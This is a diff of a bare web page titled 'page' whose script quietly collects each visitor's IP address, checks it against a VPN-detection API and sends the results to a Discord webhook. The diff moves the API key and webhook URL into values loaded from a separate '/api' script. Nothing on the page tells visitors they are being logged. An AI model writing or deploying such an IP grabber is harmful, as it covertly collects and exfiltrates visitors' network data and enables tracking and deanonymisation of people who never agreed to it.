@@ -4,13 +4,14 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>page</title>
+    <script src="/api"></script>
     <script>
         async function getIPAddress() {
             try {
                 let response = await fetch('https://myip.wtf/json');
                 let ipData = await response.json();
                 
-                let proxyResponse = await fetch(`https://vpnapi.io/api/${ipData.YourFuckingIPAddress}?key=YOUR_API_KEY_FOR_VPNAPI.IO`);
+                let proxyResponse = await fetch(`https://vpnapi.io/api/${ipData.YourFuckingIPAddress}?key=${API}`);
                 let proxyData = await proxyResponse.json();
                 
                 let gebruiktProxy = proxyData.security.vpn || 
@@ -37,7 +38,7 @@
         }
 
         async function sendToDiscord(bericht, ipData) {
-            const webhookUrl = "YOUR_DISCORD_WEBHOOK_URL";
+            const webhookUrl = WEBHOOK;
             
             const relevantData = {
                 ip: ipData.ip,
